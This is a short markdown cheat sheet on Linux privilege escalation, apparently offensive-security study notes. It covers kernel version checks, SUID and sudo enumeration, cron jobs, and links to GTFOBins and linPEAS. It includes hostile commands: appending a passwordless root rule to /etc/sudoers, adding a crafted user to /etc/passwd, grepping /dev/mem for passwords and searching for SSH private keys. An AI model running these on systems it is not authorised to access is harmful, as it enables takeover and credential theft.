# linux privilege escalation 

>it's ways to gain root privilege on victim machine
------------------------
1. **Kernel exploits**
> kernel exploit is way to escalate your privilege by exploiting the kernel 
```bash
#search for kernel version
uname -a 

#search for exploit in that version
```
------------------------
2. ** Exploiting services run as root**
> Exploiting any service which is running as root will give you Root!
```bash
#show all ports
netstat -antup

#show services which are running as root.
ps -aux | grep root
```
------------------------
3. **Exploiting SUID Executables**
> suid mean execute file with owner privilege
```bash
#show setuid
find / -perm -u=s -type f 2>/dev/null

# after you find all setuids you can check executable here and find way to escalation your privilege
https://gtfobins.github.io/
```
------------------------
4. **Exploiting SUDO rights/user**
> Exploiting misconfigured SUDO rights to get root access
```bash
#show sudo commands
sudo -l

#read executeable file or search exploit 
https://gtfobins.github.io/

```
------------------------
5. **Exploiting badly configured cron jobs**
> Cron jobs, if not configured properly can be exploited to get root privilege.

```bash
#show cron jobs in cron.d
ls -la /etc/cron.d

```
------------------------
6. **Writable files**
> you can write in sensitive fies like /etc/passwd and /etc/sudoers
```bash
#show permissions (write)
ls -la /etc/passwd
# generate a password
openssl passwd \-1 \-salt hacker hacker
mkpasswd \-m SHA\-512 hacker
python2 \-c 'import crypt; print crypt.crypt("hacker", "$6$salt")'

# then add generated password and user in /etc/passwd and switch to another user

# show permissions (write)
ls -la /etc/sudoers
# write on /stc/sudores
echo "username ALL=NOPASSWD: /bin/bash" \>>/etc/sudoers
```

------------------------
7.  **find passwords**
> ways to find passwords in the machine 
```bash
# Files that were edited in the last 10 minutes
find / \-mmin \-10 2>/dev/null | grep \-Ev "^/proc"

# In memory passwords
strings /dev/mem \-n10 | grep \-i PASS

# Find sensitive files
locate password | more

# find ssh keys 
find / -name authorized_keys 2> /dev/null
find / -name id_rsa 2> /dev/null

```
----------------------
# Reference

[docker group](https://outline.com/cHUqCJ)
[lxd group](https://book.hacktricks.xyz/linux-unix/privilege-escalation/interesting-groups-linux-pe/lxd-privilege-escalation)
[gtfobins](https://gtfobins.github.io/)
[linpeas](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/linPEAS)
[pspy](https://github.com/DominicBreuker/pspy)